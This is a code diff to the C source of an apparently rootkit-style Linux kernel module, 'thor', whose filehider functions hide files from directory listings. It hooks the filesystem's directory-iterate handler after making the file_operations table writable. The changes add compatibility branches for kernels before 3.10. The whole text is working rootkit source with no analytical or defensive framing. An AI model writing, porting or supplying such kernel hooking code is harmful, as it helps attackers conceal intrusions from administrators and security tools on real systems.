@@ -6,9 +6,14 @@
 #include <linux/fs.h>
 #include <linux/seq_file.h>
 #include <linux/slab.h>
+#include <linux/version.h>
 
 /* function prototypes */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+static int thor_fs_iterate(struct file *file, void *dirent, filldir_t filldir);
+#else
 static int thor_fs_iterate(struct file *file, struct dir_context *ctx);
+#endif
 static int thor_fs_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type);
 
@@ -25,7 +30,11 @@ static struct _file_list file_list;
 static struct file_operations *fs_fops;
 
 /* pointer to original fs_iterate function */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+static int (*orig_fs_iterate)(struct file *file, void *dirent, filldir_t filldir);
+#else
 static int (*orig_fs_iterate)(struct file *, struct dir_context *);
+#endif
 
 /* pointer to original fs_filldir function */
 static int (*orig_fs_filldir)(void *buf, const char *name, int namelen,
@@ -44,9 +53,17 @@ int filehider_init(void)
     fs_fops = (struct file_operations*) filep_etc->f_op;
     filp_close(filep_etc, NULL);
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+    orig_fs_iterate = fs_fops->readdir;
+#else
     orig_fs_iterate = fs_fops->iterate;
+#endif
     set_addr_rw(fs_fops);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+    fs_fops->readdir = thor_fs_iterate;
+#else
     fs_fops->iterate = thor_fs_iterate;
+#endif
     set_addr_ro(fs_fops);
 
     INIT_LIST_HEAD(&file_list.list);
@@ -54,6 +71,12 @@ int filehider_init(void)
     return 0;
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+static int thor_fs_iterate(struct file *file, void *dirent, filldir_t filldir)
+{
+    return orig_fs_iterate(file, dirent, thor_fs_filldir);
+}
+#else
 static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
 {
     int ret;
@@ -74,7 +97,7 @@ static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
 
     return ret;
 }
-
+#endif
 static int thor_fs_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type)
 {
@@ -133,7 +156,11 @@ void filehider_cleanup(void)
 {
     if (fs_fops != NULL && orig_fs_iterate != NULL) {
         set_addr_rw(fs_fops);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+        fs_fops->readdir = orig_fs_iterate;
+#else
         fs_fops->iterate = orig_fs_iterate;
+#endif
         set_addr_ro(fs_fops);
     }
 
